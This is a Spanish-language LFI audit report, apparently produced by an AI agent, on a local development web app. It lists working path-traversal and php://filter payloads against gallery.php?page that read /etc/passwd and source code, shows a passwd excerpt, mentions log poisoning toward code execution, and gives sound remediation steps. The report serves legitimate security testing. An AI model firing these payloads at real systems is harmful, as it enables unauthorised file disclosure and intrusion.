Informe: Auditoría LFI — web.dev.local:8081
Fecha: 2026-04-18T18:29:18Z
Auditor: gpt5-mini (Copilot CLI)

Resumen ejecutivo
Se detectó y explotó una vulnerabilidad de Local File Inclusion (LFI) en la aplicación en http://web.dev.local:8081. La inclusión arbitraria permite leer archivos del filesystem del servidor (prueba: /etc/passwd).

Detalles técnicos
- URL vulnerable: /gallery.php?page=<valor>
- Parámetro vulnerable: page (en gallery.php)
- Payloads de prueba que devolvieron datos:
  * gallery.php?page=../../../../etc/passwd  -> mostró contenido de /etc/passwd
  * gallery.php?page=../../../../etc/hosts   -> mostró /etc/hosts
  * gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php -> mostró fuente (fallback de error/aviso y contenido)
- Respuesta de prueba (extracto de /etc/passwd):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Evidencias (comandos usados)
- GET http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
- GET http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php

Impacto
- Divulgación de archivos sensibles (p. ej. /etc/passwd, /etc/hosts).
- Posible escalada a RCE si existen logs o funcionalidades que permitan inyectar código y luego incluirlo (log poisoning), o si se combinan con wrappers que permitan ejecución.

Pruebas de explotación
Se leyó con éxito /etc/passwd desde el servidor remoto usando el parámetro "page" de gallery.php, por lo que la vulnerabilidad fue explotada con éxito para lectura de archivos.

Recomendaciones
1. No incluir archivos basándose en entrada del usuario. Usar un mapeo (whitelist) de páginas permitidas (por ejemplo: 'modern','classic','abstract','about').
2. Normalizar y validar entradas (permitir solo nombres simples, rechazar rutas con ../). Usar basename() y comprobar realpath() dentro de un directorio seguro.
3. Desactivar allow_url_include y limitar include_path en php.ini.
4. Ejecutar análisis adicional para buscar vectores de RCE (logs, uploads). Auditar logs y prevenir log poisoning.
5. Aplicar principio de menor privilegio al usuario que ejecuta el servidor web y proteger archivos sensibles.

Conclusión
La aplicación es vulnerable a LFI a través de gallery.php?page. Se confirmó acceso a archivos del sistema (explotación exitosa para lectura). Corregir de inmediato y revisar otras páginas similares.
